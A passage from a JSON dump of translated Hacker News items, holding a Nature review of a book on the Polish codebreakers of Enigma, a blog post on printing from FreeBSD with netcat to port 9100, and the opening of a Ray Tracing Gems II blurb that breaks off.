\u5982\u4f55\u8058\u8bf7\u4e00\u7fa4\u6570\u5b66\u5b66\u751f\u6765\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\u3002\u4ed6\u4eec\u5728\u5730\u4e0b\u5ba4\u548c\u6811\u6797\u6df1\u5904\u7684\u4e00\u4e2a\u63a9\u4f53\u4e2d\u5b89\u9759\u5730\u5de5\u4f5c\u3002\u6ce2\u5170\u6ce2\u5179\u5357\u5927\u5b66\u7684\u6821\u53cb\u739b\u4e3d\u5b89\u00b7\u96f7\u8036\u592b\u65af\u57fa\uff08Marian Rejewski\uff09\u5c31\u662f\u5176\u4e2d\u4e4b\u4e00\u3002\u638c\u8235\u7684\u662f Gwido Langer\uff0c\u4ed6\u662f\u4e00\u540d\u6ce2\u5170\u4eba\uff0c\u66fe\u4e3a\u5965\u5730\u5229\u519b\u961f\u4ece\u4e8b\u65e0\u7ebf\u7535\u60c5\u62a5\u5de5\u4f5c\u3002\n\u4e0e\u6b64\u540c\u65f6\uff0c\u5728\u6cd5\u56fd\uff0c\u53e4\u65af\u5854\u592b\u00b7\u4f2f\u7279\u5170 (Gustave Bertrand) \u9886\u5bfc\u7740\u540c\u7b49\u90e8\u95e8\u3002\u6cd5\u56fd\u4eba\u6709\u4e00\u79cd\u66f4\u4f20\u7edf\u7684\u6536\u96c6\u4fe1\u606f\u7684\u65b9\u6cd5\uff1a\u4f18\u79c0\u7684\u4ee3\u7406\u4eba\u3001\u79d8\u5bc6\u4f1a\u8bae\u548c\u6177\u6168\u7684\u56de\u62a5\u3002\u4f2f\u7279\u5170\u7ba1\u7406\u7740\u4e24\u4e2a\u5f3a\u5927\u7684\u95f4\u8c0d\u3002\u9c81\u9053\u592b\u00b7\u65af\u6258\u66fc\uff08Rudolf Stallmann\uff09\u2014\u2014\u4ee3\u53f7\u96f7\u514b\u65af\uff08Rex\uff09\u2014\u2014\u662f\u4e00\u4f4d\u5fb7\u56fd\u4eba\uff0c\u4ed6\u66fe\u5047\u626e\u6210\u7537\u7235\u5411\u8d4c\u573a\u89c2\u4f17\u6325\u970d\uff1b\u4ed6\u8f7b\u677e\u5730\u5b66\u4f1a\u4e86\u8bed\u8a00\u548c\u4eba\u3002 Rex \u62db\u52df\u4e86 Hans-Thilo Schmidt\uff0c\u5373 Asche \u7279\u5de5\uff0c\u4ed6\u7684\u5144\u5f1f\u662f\u5fb7\u56fd\u519b\u961f\u7684\u4e0a\u6821\u3002 Schmidt \u5411\u6cd5\u56fd\u4eba\u63d0\u4f9b\u4e86\u6210\u7bb1\u7684\u519b\u4e8b\u6587\u4ef6\uff0cRex \u6536\u5230\u4e86\u8fd9\u4e9b\u6587\u4ef6\uff0cBertrand \u548c\u4ed6\u7684\u540c\u4e8b\u4eec\u5728\u9152\u5e97\u7684\u6d74\u5ba4\u91cc\u62cd\u7167\u3002\u4f2f\u7279\u5170\u5efa\u7acb\u4e86\u4e00\u4e2a\u5171\u4eab\u60c5\u62a5\u7684\u7f51\u7edc\uff0c\u5305\u62ec\u4e0e\u6ce2\u5170\u548c\u82f1\u56fd\u3002 1931 \u5e74\uff0c\u4ed6\u540c\u610f\u5411\u5170\u683c\u63d0\u4f9b\u5fb7\u56fd\u519b\u4e8b\u6587\u4ef6\uff0c\u5982\u679c\u6ce2\u5170\u4eba\u5c06\u89e3\u5bc6\u7684\u5fb7\u56fd\u4fe1\u606f\u4f20\u56de\u3002\u65bd\u5bc6\u7279\u4f20\u9012\u7684\u5176\u4e2d\u4e00\u4efd\u6587\u4ef6\u662f Enigma \u7684\u624b\u518c\u3002 Langer\u3001Ci\u0119\u017cki \u548c Rejewski \u8df3\u4e0a\u4e86\u5b83\u3002\u4ed6\u4eec\u53d1\u73b0\u6dfb\u52a0\u5230\u673a\u5668\u524d\u9762\u7684\u9762\u677f\u6539\u53d8\u4e86\u8bbe\u7f6e\uff0c\u5c3d\u7ba1\u4ed6\u4eec\u4ecd\u7136\u65e0\u6cd5\u786e\u5b9a\u8bbe\u5907\u662f\u5982\u4f55\u63a5\u7ebf\u7684\u3002\u4ed6\u4eec\u5f00\u59cb\u6536\u96c6\u7f16\u7801\u4fe1\u606f\u5e76\u8fd0\u7528\u4ed6\u4eec\u7684\u667a\u6167\u5bfb\u627e\u7ebf\u7d22\u3002\u6709\u65f6\u53d1\u4ef6\u4eba\u4f1a\u72af\u9519\u8bef\u3002\u5fb7\u56fd\u58eb\u5175\u53ef\u80fd\u4f1a\u4f7f\u7528\u7b80\u5355\u7684\u4e09\u4e2a\u5b57\u6bcd\u7ec4\u5408\uff0c\u4f8b\u5982 QQQ\uff0c\u5c06\u8bbe\u7f6e\u5e7f\u64ad\u5230\u63a5\u6536\u5668\u3002\u6709\u65f6\uff0c\u8fd9\u4e9b\u4fe1\u606f\u53ef\u4ee5\u88ab\u731c\u5230\uff1a\u4f8b\u5982\uff0c\u4ed6\u4eec\u7ecf\u5e38\u8bf4 maschine defekt\u3002\u5230 1936 \u5e74\uff0c\u5728\u6218\u4e89\u51c6\u5907\u9636\u6bb5\uff0c\u5fb7\u56fd\u519b\u65b9\u6b63\u5728\u52a0\u5f3a\u5176\u901a\u8baf\u3002\u540c\u5e74 10 \u6708\uff0c\u53d1\u9001\u8005\u5f00\u59cb\u6bcf\u5929\u91cd\u7f6e Enigma \u673a\u5668\u3002 Dermot Turing \u8ba4\u4e3a\u53e6\u4e00\u4f4d\u6ce2\u5170\u6570\u5b66\u5bb6 Jerzy R\u00f3\u017cycki \u610f\u8bc6\u5230\u8fd9\u6539\u53d8\u4e86\u5b57\u6bcd\u7684\u9891\u7387\uff0c\u63ed\u793a\u4e86\u989d\u5916\u7684\u4fe1\u606f\u3002\u8be5\u56e2\u961f\u5f00\u53d1\u4e86\u5904\u7406\u6570\u767e\u79cd\u6392\u5217\u7684\u5de5\u5177\uff0c\u5305\u62ec\u7a7f\u5b54\u5361\u7247\u548c\u5e26\u6709\u6a21\u4eff Enigma \u7684\u8f6c\u5b50\u7684\u673a\u68b0\u8bbe\u5907\uff0c\u51fa\u4e8e\u4e0d\u786e\u5b9a\u7684\u539f\u56e0\uff0c\u8be5\u56e2\u961f\u5c06\u5176\u79f0\u4e3a\u70b8\u5f39\u3002\u8fd9\u4e24\u4e2a\u6982\u5ff5\u540e\u6765\u90fd\u88ab Alan Turing \u4f7f\u7528\u548c\u5f00\u53d1\u3002 Bertrand \u5c06\u8fd9\u4e9b\u4fe1\u606f\u53cd\u9988\u7ed9\u4e86\u82f1\u56fd\u7684\u5bc6\u7801\u7834\u8bd1\u8005\uff0c\u4ed6\u4eec\u5728\u4e66\u4e2d\u7ed9\u4eba\u7684\u611f\u89c9\u662f\u5e7d\u9ed8\u4f46\u51b7\u6f20\u3002\u4ed6\u4eec\u79f0\u6cd5\u56fd\u5feb\u9012\u2014\u2014\u7528\u7ea2\u8272\u6807\u8bb0 TR\u00c8S SECRET\u2014\u2014\u7329\u7ea2\u8272 pimpernels\u3002 1939 \u5e74 7 \u6708\u4e0b\u65ec\uff0c\u5c31\u5728\u5fb7\u56fd\u519b\u961f\u8fdb\u5165\u6ce2\u5170\u524d\u4e00\u4e2a\u591a\u6708\uff0c\u4f2f\u7279\u5170\u5b89\u6392\u4e86\u53d7\u4eba\u5c0a\u656c\u7684\u82f1\u56fd\u5bc6\u7801\u5b66\u5bb6 Dillwyn &#39;Dilly&#39; Knox\uff08\u4ed6\u5df2\u7ecf\u5728 Bletchley \u4ece\u4e8b Enigma \u5de5\u4f5c\uff09\u5728\u534e\u6c99\u9644\u8fd1\u4f1a\u89c1\u5170\u683c\u7684\u56e2\u961f\u3002\u6ce2\u5170\u4eba\u60f3\u4f20\u6388\u4ed6\u4eec\u7684\u77e5\u8bc6\u3002\u8bfa\u514b\u65af\u6700\u521d\u5bf9\u4ed6\u4eec\u6bb4\u6253\u4ed6\u611f\u5230\u6124\u6012\uff0c\u540e\u6765\u5411\u6ce2\u5170\u4eba\u53d1\u9001\u4e86\u4e00\u6761\u5370\u6709\u8d5b\u9a6c\u573a\u666f\u7684\u4e1d\u5dfe\uff0c\u4ee5\u627f\u8ba4\u4ed6\u4eec\u8d62\u4e86\u3002\u82f1\u56fd\u4eba\u7acb\u5373\u52a0\u5927\u4e86\u5e03\u83b1\u5207\u5229\u516c\u56ed\u7684\u5bc6\u7801\u7834\u89e3\u5de5\u4f5c\uff1b\u51e0\u4e2a\u6708\u5185\uff0c\u827e\u4f26\u00b7\u56fe\u7075\u91cd\u65b0\u8bbe\u8ba1\u4e86\u70b8\u5f39\uff0c\u4f7f\u5176\u5de5\u4f5c\u5f97\u66f4\u5feb\u3002\u6ce2\u5170\u4eba\u7684\u89c1\u89e3\u4e3a\u4ed6\u8282\u7701\u4e86\u4e00\u5e74\u7684\u5de5\u4f5c\u65f6\u95f4\u3002\u6218\u4e89\u7206\u53d1\u540e\uff0c\u6ce2\u5170\u65e0\u7ebf\u7535\u60c5\u62a5\u5355\u4f4d\u88ab\u89e3\u6563\u3002\u5bc6\u7801\u7834\u8bd1\u8005\u63a9\u57cb\u4e86\u4ed6\u4eec\u7684\u7b14\u8bb0\u548c\u673a\u5668\u5e76\u9003\u8dd1\u4e86\u3002\u4e00\u4e9b\u4eba\u6700\u7ec8\u53bb\u4e86\u963f\u5c14\u53ca\u5229\u4e9a\uff0c\u5176\u4f59\u7684\u4eba\u5728\u6cd5\u56fd\u4e3a Bertrand \u5de5\u4f5c\uff0c\u540e\u8005\u5728\u6cd5\u56fd\u5357\u90e8\u7684\u4e00\u5ea7\u57ce\u5821\u4e2d\u6210\u7acb\u4e86\u4e00\u4e2a\u65e0\u7ebf\u7535\u60c5\u62a5\u5c0f\u7ec4\u3002\u5728\u4ee4\u4eba\u60ca\u53f9\u7684\u6bb5\u843d\u4e2d\uff0c\u8fd9\u672c\u4e66\u63ed\u793a\u4e86\u5927\u591a\u6570\u6ce2\u5170\u5bc6\u7801\u7834\u8bd1\u8005\u5982\u4f55\u5ea6\u8fc7\u6218\u4e89\uff0c\u5728\u6cd5\u56fd\u88ab\u5360\u9886\u65f6\u5229\u7528\u6cd5\u56fd\u62b5\u6297\u8fd0\u52a8\u5e76\u8eb2\u907f\u5fb7\u56fd\u7684\u519b\u4e8b\u60c5\u62a5\u90e8\u95e8\u548c\u79d8\u5bc6\u8b66\u5bdf\u3002\u4f5c\u4e3a\u5b9d\u8d35\u7684\u8d44\u4ea7\uff0c\u5bc6\u7801\u7834\u89e3\u8005\u662f\u4e0d\u5141\u8bb8\u6218\u6597\u7684\u3002\u4e66\u4e2d\u7684\u611f\u4eba\u7167\u7247\u663e\u793a\uff0c\u4ed6\u4eec\u4e92\u76f8\u5f00\u73a9\u7b11\uff0c\u5e76\u5728\u707e\u96be\u4e2d\u4e0e\u5973\u53cb\u5171\u5ea6\u65f6\u5149\u3002\n\u6700\u7ec8\uff0cCi\u0119\u017cki \u548c Langer \u88ab\u902e\u6355\u5e76\u62d8\u7981\u5728\u82cf\u53f0\u5fb7\u5730\u533a\uff08\u73b0\u5728\u662f\u6377\u514b\u5171\u548c\u56fd\u7684\u4e00\u90e8\u5206\uff09\u3002\u6218\u4e89\u7ed3\u675f\u540e\uff0c\u4ed6\u4eec\u5b9a\u5c45\u5728\u82cf\u683c\u5170\u3002\u5e15\u5362\u65af\u4e8e 1945 \u5e74\u5728\u5fb7\u56fd\u9047\u96be\uff0c\u5f53\u65f6\u4ed6\u5728\u8428\u514b\u68ee\u8c6a\u68ee\u96c6\u4e2d\u8425\u5de5\u4f5c\u7684\u4e00\u5bb6\u98de\u673a\u5de5\u5382\u906d\u5230\u8f70\u70b8\u3002\u4f2f\u7279\u5170\u5de7\u5999\u5730\u53d1\u6325\u4e86\u5404\u65b9\u529b\u91cf\u3002\u4e3a\u4e86\u907f\u514d\u6210\u4e3a\u53cc\u91cd\u95f4\u8c0d\uff0c\u4ed6\u6700\u7ec8\u6210\u4e3a\u4e86\u4e00\u540d\u5c06\u519b\u3002 1972 \u5e74\uff0c\u4ed6\u5199\u4e86\u4e00\u672c\u5173\u4e8e Enigma \u7684\u6d41\u884c\u6cd5\u8bed\u4e66\uff0c\u4e8e\u662f X\u3001Y\u3001Z \u548c Bletchley \u7684\u6545\u4e8b\u5f00\u59cb\u6d41\u4f20\u5f00\u6765\u3002\u7535\u5b50\u90ae\u4ef6\u5730\u5740 \u662f\u7684\uff01\u6ce8\u518c\u6211\u4ee5\u63a5\u6536\u6bcf\u65e5\u81ea\u7136\u7b80\u62a5\u7535\u5b50\u90ae\u4ef6\u3002\u6211\u540c\u610f\u5c06\u6839\u636e Nature \u548c Springer Nature Limited \u9690\u79c1\u653f\u7b56\u5904\u7406\u6211\u7684\u4fe1\u606f\u3002", "note_en": "X, Y &amp; Z: The Real Story of How Enigma Was Broken  Dermot Turing The History Press (2018)\n Alan Turing\u2019s crucial unscrambling of German messages in the Second World War was a tour de force of codebreaking. From 1940 onwards, Turing and his team engineered hundreds of electronic machines, dubbed bombes, which decrypted the thousands of missives sent by enemy commanders each day to guide their soldiers. This deluge of knowledge shortened the war. Bletchley Park, UK \u2014 the secret centre where it all happened \u2014 rightly gained its place in history. But as with all breakthroughs, many more people laid the foundations.\n In his book  X, Y &amp; Z, Dermot Turing, the great mathematician\u2019s nephew, tells the gripping story of a band of Polish mathematicians who figured out much about how German Enigma encoding machines operated, years before Alan Turing did. The Poles shared their secrets with French and British intelligence services before and during the Second World War \u2014 the letters X, Y and Z were shorthand for the French, British and Polish codebreaking teams, respectively.\n The author\u2019s research is painstaking. After the war, military documents were scattered across Europe, and key French records were declassified only in 2016. Many original Polish papers were destroyed, but the mathematicians\u2019 families have shared personal letters. Turing unearths a remarkable tale of intellect, bravery and camaraderie that reads like a nail-biting spy novel.\n Polish skills in cryptography and radio engineering came together during the 1920 Russo-Polish War. Signallers decoded a telegram from Red Army military commander Joseph Stalin, which indicated that an attack on Warsaw was imminent. Jamming the Russians\u2019 radio communications bought enough time to secure and save the city. Maksymilian Ci\u0119\u017cki and Antoni Palluth were among those signallers. After the 1920 conflict, Ci\u0119\u017cki became leader of a radio-intelligence unit. Palluth set up a business making electronic equipment, including radios the size of a credit card for Polish secret agents.\n  In 1926, the German navy began to send messages that were scrambled in a more random way, making them almost impossible to decipher. They were encoded using the typewriter-like Enigma machine. The keyboard was wired so that typing one letter lit up a different one in a set of bulbs on top. Rotors altered the path of the electric circuit with every keystroke. The machines were commercially available but modified for German military use. Without knowing the precise setting of a machine, there was no way to unpick the code.\n The book tells how Ci\u0119\u017cki hired a group of mathematics students to crack the problem. They worked quietly in basements and in a bunker deep in the woods. Marian Rejewski, an alumnus of Pozna\u0144 University in Poland, was one. At the helm was Gwido Langer, a Pole who had worked in radio intelligence for the Austrian army.\n Meanwhile, in France, Gustave Bertrand headed the equivalent unit. The French had a more conventional approach to gathering information: good agents, clandestine meetings and generous pay-offs. Bertrand managed two formidable spies. Rudolf Stallmann \u2014 code name Rex \u2014 was a German card-sharp who had posed as a baron to fleece casino-goers; he picked up languages and people with ease. Rex recruited Hans-Thilo Schmidt, or Agent Asche, whose brother was a colonel in the German army. Schmidt supplied cases of military documents to the French, which Rex received and Bertrand and his colleagues photographed in hotel bathrooms.\n Bertrand built up a network for sharing intelligence, including with Poland and the United Kingdom. In 1931, he agreed to supply Langer with German military documents if the Poles would pass back decrypted German messages. One of those documents, passed on by Schmidt, was a manual for Enigma.\n  Langer, Ci\u0119\u017cki and Rejewski leapt on it. They discovered that a panel added to the front of the machine altered the settings, although they still could not tell how the device was wired. They set about collecting coded messages and applied their wits to find clues. Sometimes the senders made telling mistakes. The German soldiers might use simple sets of three letters, such as QQQ, to broadcast the settings to the receiver. Occasionally, the messages could be guessed: for instance, they often said  maschine defekt.\n By 1936, in the run-up to war, the German military was tightening its communications. In October that year, the senders began to reset the Enigma machines daily. Dermot Turing credits another Polish mathematician, Jerzy R\u00f3\u017cycki, with realizing that this altered the frequency of letters, revealing extra information. The team developed tools to work through the hundreds of permutations, including punched cards and a mechanical device with rotors that mimicked Enigma, which, for uncertain reasons, the team called a  bomba. Both concepts were later used and developed by Alan Turing.\n Bertrand fed this information back to Britain\u2019s codebreakers, who come across in the book as humorous but aloof. They called the French dispatches \u2014 stamped  TR\u00c8S SECRET in red \u2014 scarlet pimpernels. In late July 1939, just over a month before the German army marched into Poland, Bertrand arranged for the respected British cryptologist Dillwyn \u2018Dilly\u2019 Knox (who was already working on Enigma at Bletchley) to meet Langer\u2019s team near Warsaw. The Poles wanted to pass on their knowledge. Initially angry that they had beaten him to it, Knox later sent the Poles a silk scarf printed with a horse-racing scene to concede that they had won.\n  The British immediately ramped up codebreaking efforts at Bletchley Park; within a few months, Alan Turing had re-engineered the bombes to work more quickly. The Polish insights saved him a year of work.\n When war broke out, the Polish radio-intelligence unit was wound up. The codebreakers buried their notes and machines and fled. Some ended up in Algeria, the rest in France working for Bertrand, who had set up a radio-intelligence group in a chateau in southern France. In breathtaking passages, the book reveals how most of the Polish codebreakers made it through the war, tapping into the French Resistance and dodging Germany\u2019s military-intelligence services and secret police when France became occupied. As valuable assets, the codebreakers were not allowed to fight. Touching photographs in the book show them joking with each other and spending time with girlfriends amid the devastation.\n Eventually, Ci\u0119\u017cki and Langer were arrested and interned in the Sudetenland (now part of the Czech Republic). After the war, they settled in Scotland. Palluth was killed in Germany in 1945, when an aeroplane factory in which he was working at Sachsenhausen concentration camp was bombed. Bertrand artfully played all sides. Avoiding becoming a double agent, he ended up a general. In 1972, he wrote a popular French book about Enigma, and so the story of X, Y and Z and Bletchley began to seep out.\n                    Email address    Yes! Sign me up to receive the daily  Nature Briefing email. I agree my information will be processed in accordance with the  Nature and Springer Nature Limited  Privacy Policy.", "posttime": "2021-08-05 20:54:35", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "enigma,heroes,\u5fb7\u56fd", "title": "\u88ab\u9057\u5fd8\u7684 Enigma Story (2018) \u82f1\u96c4", "title_en": "Forgotten heroes of the Enigma Story (2018)", "transed": 1, "url": "https://www.nature.com/articles/d41586-018-06149-y", "via": "", "real_tags": ["enigma", "heroes", "\u5fb7\u56fd"]}, {"category": "", "categoryclass": "", "imagename": "", "infoid": 1071335, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "\u6211\u6700\u8fd1\u5c06\u6211\u7684\u65e5\u5e38\u7b14\u8bb0\u672c\u7535\u8111\u8fc1\u79fb\u5230\u4e86 FreeBSD\u3002\u6211\u6709\u4e00\u53f0\u8054\u7f51\u7684 HP LaserJet\u3002\u5728 Linux \u4e0a\u4f7f\u7528 CUPS 10 \u591a\u5e74\u540e\uff0c\u6211\u4e00\u76f4\u5bb3\u6015\u5728\u53e6\u4e00\u53f0\u673a\u5668\u4e0a\u8bbe\u7f6e\u8fd9\u53f0\u6253\u5370\u673a\u3002\u4f46\u662f\u8fd9\u4e00\u5929\u6765\u4e86\u3002\u6211\u4e0d\u5f97\u4e0d\u6253\u5370\u76f8\u5f53\u591a\u7684\u6587\u6863\uff0c\u6240\u4ee5\u6211\u51b3\u5b9a\u786c\u7740\u5934\u76ae\u5728 FreeBSD \u4e0a\u8bbe\u7f6e\u6253\u5370\u3002\u6211\u53bb\u4e86 FreeBSD \u624b\u518c\u3002\u65b9\u4fbf\u7684\u662f\uff0c\u4ed6\u4eec\u6709\u4e00\u7ae0\u5173\u4e8e\u6253\u5370\u3002\u9274\u4e8e\u6211\u8fc7\u53bb\u4f7f\u7528 CUPS \u7684\u7ecf\u9a8c\uff0c\u6211\u8ba4\u4e3a\u8fd9\u5c06\u662f\u4e00\u6b21\u5371\u9669\u7684\u65c5\u7a0b\uff0c\u6240\u4ee5\u6211\u5728\u5f00\u59cb\u4e4b\u524d\u9605\u8bfb\u4e86\u6574\u4e2a\u6587\u6863\u3002\u7b2c 4 \u8282\u7a81\u51fa\uff1a\u76f4\u63a5\u6253\u5370\u5230\u7f51\u7edc\u6253\u5370\u673a\u53d6\u51b3\u4e8e\u6253\u5370\u673a\u7684\u80fd\u529b\uff0c\u4f46\u5927\u591a\u6570\u63a5\u53d7\u7aef\u53e3 9100 \u4e0a\u7684\u6253\u5370\u4f5c\u4e1a\uff0c\u5e76\u4e14 nc(1) \u53ef\u4ee5\u4e0e\u5b83\u200b\u200b\u4eec\u4e00\u8d77\u4f7f\u7528\u3002\u6211\u4e0d\u5f97\u4e0d\u591a\u6b21\u9605\u8bfb\u8fd9\u7bc7\u6587\u7ae0\u3002\u8dc6\u62f3\u9053\u3002\u4f7f\u7528\u7f51\u732b\uff1f\u5f53\u7136\uff0c\u6211\u5728 FreeBSD \u5185\u6838\u4e2d\u9057\u6f0f\u4e86\u4e00\u4e9b\u5c06\u7f51\u7edc\u6253\u5370\u673a\u914d\u7f6e\u4e3a\u522b\u540d\u4e3a netlaser \u7684\u672c\u5730\u7f51\u7edc\u76ee\u6807\u7684\u9b54\u6cd5\uff0c\u5b83\u4e3a\u6211\u5904\u7406\u4e86\u6240\u6709\u7684\u6253\u5370\u9b54\u6cd5\u3002\u4f46\u662f\u5982\u4f55\uff1f\u591a\u5e74\u4ece CUPS \u4e2d\u7c7b\u4f3c\u540d\u79f0\u7684\u6253\u5370\u9a71\u52a8\u7a0b\u5e8f\u5217\u8868\u4e2d\u4efb\u610f\u6311\u9009\uff0c\u4f7f\u6211\u7684\u5927\u8111\u65e0\u6cd5\u63a5\u53d7\u6240\u5199\u7684\u5185\u5bb9\u3002\u6211\u5f88\u56f0\u60d1\u3002\u5728\u8bd5\u56fe\u7834\u8bd1\u6587\u6863\u4e2d\u7684\u5176\u4ed6\u90e8\u5206\u540e\uff0c\u6211\u51b3\u5b9a\u6211\u4f1a\u53bb\u505a\u3002\u7ecf\u8fc7 10 \u591a\u5e74\u7684 Linux \u53d1\u884c\u7248\u63a8\u52a8 CUPS\u3002\u5341\u591a\u5e74\u6765\uff0c\u6211\u4ece\u4e0d\u5b8c\u5168\u4fe1\u4efb\u8fd9\u4e9b\u590d\u6742\u7684\u9a71\u52a8\u7a0b\u5e8f\u548c\u5b88\u62a4\u7a0b\u5e8f\u5806\u6808\uff0c\u4f46\u201c\u6ca1\u6709\u5b83\u5c31\u6d3b\u4e0d\u4e0b\u53bb\u201d\u3002 FreeBSD \u51fa\u73b0\u65f6\u5c31\u50cf\u201c\u662f\u7684\uff0c\u53ea\u9700\u4f7f\u7528 netcat\u201d\u3002\u4ed6\u4eec\u662f\u5bf9\u7684\u3002\u5c31\u7528\u7f51\u732b\u5427\u3002", "note_en": "I recently migrated my daily laptop to FreeBSD. I have a networked HP LaserJet. After 10+ years of CUPS on Linux, I had been dreading setting up this printer on yet another machine. But the day came. I had to print quite a few documents so I decided to bite the bullet and setup printing on FreeBSD.\n Off to the FreeBSD Handbook I went. Conveniently, they have a chapter on  Printing. Given my past experience with CUPS, I figured this was going to be a treacherous journey so I read the entire document before getting started. Section 4 stood out:\n Direct printing to network printers depends on the abilities of the printer, but most accept print jobs on port 9100, and  nc(1) can be used with them.\n   I had to read this several times. WTF. Use netcat? Surely I was missing some wizardry in the FreeBSD kernel that configured a network printer as some local network target aliased to netlaser, which handled all the printing magic for me. But how? Years of arbitrarily picking from a list of similarly named print drivers in CUPS prevented my brain from accepting what was written. I was confused. After trying to decipher the other sections in the document, I decided I would go for it.\n    After 10+ years of Linux distributions pushing CUPS on me. Over a decade of this complex stack of drivers and daemons that I never quite trusted but \u201ccouldn\u2019t live without.\u201d FreeBSD comes along and is like \u201cyeah, just use netcat.\u201d And they\u2019re right. Just use netcat.", "posttime": "2021-08-05 20:54:05", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "\u6253\u5370,cups,freebsd", "title": "\u518d\u89c1 CUPS\uff1a\u4f7f\u7528 Netcat \u6253\u5370", "title_en": "Bye CUPS: Printing with Netcat", "transed": 1, "url": "https://retrohacker.substack.com/p/bye-cups-printing-with-netcat", "via": "", "real_tags": ["\u6253\u5370", "cups", "freebsd"]}, {"category": "", "categoryclass": "", "imagename": "11f1999481af50daa189491722665b99.jpg", "infoid": 1071333, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "\u8fd9\u672c\u5f00\u653e\u83b7\u53d6\u4e66\u7c4d\u662f\u4efb\u4f55\u5bf9\u5b9e\u65f6\u6e32\u67d3\u611f\u5174\u8da3\u7684\u4eba\u7684\u5fc5\u5907\u4e4b\u4e66\u3002\u5149\u7ebf\u8ffd\u8e2a\u662f\u6e38\u620f\u56fe\u5f62\u7684\u5723\u676f\uff0c\u5b83\u6a21\u62df\u5149\u7684\u7269\u7406\u884c\u4e3a\uff0c\u4e3a\u5373\u4f7f\u662f\u89c6\u89c9\u6700\u5f3a\u70c8\u7684\u6e38\u620f\u5e26\u6765\u5b9e\u65f6\u3001\u7535\u5f71\u54c1\u8d28\u7684\u6e32\u67d3\u3002\u5149\u7ebf\u8ffd\u8e2a\u4e5f\u662f\u4e00\u79cd\u7528\u4e8e\u67b6\u6784\u5e94\u7528\u3001\u53ef\u89c6\u5316\u3001\u58f0\u97f3\u6a21\u62df\u3001\u6df1\u5ea6\u5b66\u4e60\u7b49\u7684\u57fa\u672c\u7b97\u6cd5\u3002\u8981\u8d62\u5f97 Ray Tracing Gems II \u7684\u9650\u91cf\u7248\u5370\u5237\u526f\u672c\uff0c\u8bf7\u5728\u6b64\u5904\u53c2\u52a0\u8d60\u54c1\u7ade\u8d5b\uff1ahttps://developer.nvidia.com/ray-tracing-gems-ii 2018 \u5e74\uff0c\u5b9e\u65f6\u5149\u7ebf\u8ffd\u8e2a\u8fdb\u5165\u6d88\u8d39\u7ea7 GPU \u786c\u4ef6\u548c\u8fc5\u901f\u786e\u7acb\u4e86\u81ea\u5df1\u4f5c\u4e3a\u672a\u6765\u5982\u4f55\u751f\u6210\u56fe\u50cf\u7684\u5173\u952e\u7ec4\u6210\u90e8\u5206\u3002\u73b0\u5728\uff0c\u4e09\u5e74\u540e\uff0c\u8be5\u786c\u4ef6\u7684\u7b2c\u4e8c\u6b21\u8fed\u4ee3\u53ef\u7528\uff0c\u4e3b\u6d41\u6e38\u620f\u673a\u652f\u6301\u5149\u7ebf\u8ffd\u8e2a\uff0c\u5e76\u4e14\u5df2\u7ecf\u5efa\u7acb\u4e86\u8de8\u5e73\u53f0 API \u6807\u51c6\u4ee5\u63a8\u52a8\u66f4\u5e7f\u6cdb\u7684\u91c7\u7528\u3002\u5f00\u53d1\u4eba\u5458\u548c\u7814\u7a76\u4eba\u5458\u4e00\u76f4\u5fd9\u4e8e\u53d1\u660e\uff08\u548c\u91cd\u65b0\u53d1\u660e\uff09\u7b97\u6cd5\uff0c\u4ee5\u5229\u7528\u8fd9\u4e9b\u8fdb\u6b65\u521b\u9020\u7684\u65b0\u53ef\u80fd\u6027\u3002\u5728\u6b64\u8fc7\u7a0b\u4e2d\u53d1\u73b0\u7684\u77e5\u8bc6\u201c\u5b9d\u77f3\u201d\u5c31\u662f\u60a8\u5c06\u5728 Ray Tracing Gems II \u4e2d\u627e\u5230\u7684\u4e1c\u897f\u3002\u5728\u6f5c\u5165\u5b9d\u5e93\u4e4b\u524d\uff0c\u6211\u4eec\u60f3\u786e\u4fdd\u60a8\u4e86\u89e3\u4ee5\u4e0b\u5185\u5bb9\uff1a \u5f00\u653e\u83b7\u53d6\u5185\u5bb9\u5141\u8bb8\u60a8\u81ea\u7531\u590d\u5236\u548c\u91cd\u65b0\u5206\u53d1\u4efb\u4f55\u7ae0\u8282\u6216\u6574\u672c\u4e66\uff0c\u53ea\u8981\u60a8\u7ed9\u51fa\u9002\u5f53\u7684\u4fe1\u7528\u5e76\u4e14\u4e0d\u5c06\u5176\u7528\u4e8e\u5546\u4e1a\u7528\u9014\u76ee\u7684\u3002\u5177\u4f53\u8bb8\u53ef\u662f\u77e5\u8bc6\u5171\u4eab\u7f72\u540d 4.0 \u56fd\u9645\u8bb8\u53ef\uff08CC-BY-NC-ND\uff09\u3002\u6211\u4eec\u8fd9\u6837\u505a\u662f\u4e3a\u4e86\u8ba9\u4f5c\u8005\u548c\u5176\u4ed6\u6240\u6709\u4eba\u90fd\u80fd\u5c3d\u53ef\u80fd\u5feb\u901f\u3001\u5e7f\u6cdb\u548c\u516c\u5e73\u5730\u4f20\u64ad\u672c\u4e66\u4e2d\u7684\u4fe1\u606f\u3002\u50cf\u8fd9\u6837\u5199\u4e00\u672c\u9009\u96c6\u98ce\u683c\u7684\u4e66\u662f\u4e00\u79cd\u96c6\u4f53\u4fe1\u4ef0\u7684\u884c\u4e3a\u3002\u76f8\u4fe1\u4f5c\u8005\u3001\u7f16\u8f91\u3001\u51fa\u7248\u5546\u548c\u65e5\u7a0b\u5b89\u6392\u90fd\u4f1a\u6c47\u805a\u5728\u4e00\u8d77\uff0c\u4e3a\u8bfb\u8005\u5e26\u6765\u6709\u4ef7\u503c\u7684\u7ed3\u679c\u3002\u5728\u6b63\u5e38\u60c5\u51b5\u4e0b\uff0c\u8fd9\u662f\u4e00\u9879\u8270\u5de8\u7684\u4efb\u52a1\uff0c\u4f46\u8fc7\u53bb\u4e00\u5e74\u534a\u7684\u65f6\u95f4\u5374\u4e00\u70b9\u4e5f\u4e0d\u201c\u6b63\u5e38\u201d\u3002\u8fd9\u672c\u4e66\u7684\u53c2\u4e0e\u53f7\u53ec\u662f\u5728 2019 \u5e74 11 \u6708\u4e0b\u65ec\u53d1\u5e03\u7684\uff0c\u5f53\u65f6 COVID-19 \u75c5\u6bd2\u5f00\u59cb\u5728\u4e9a\u6d32\u51fa\u73b0\u3002\u5728\u6b64\u540e\u7684 18 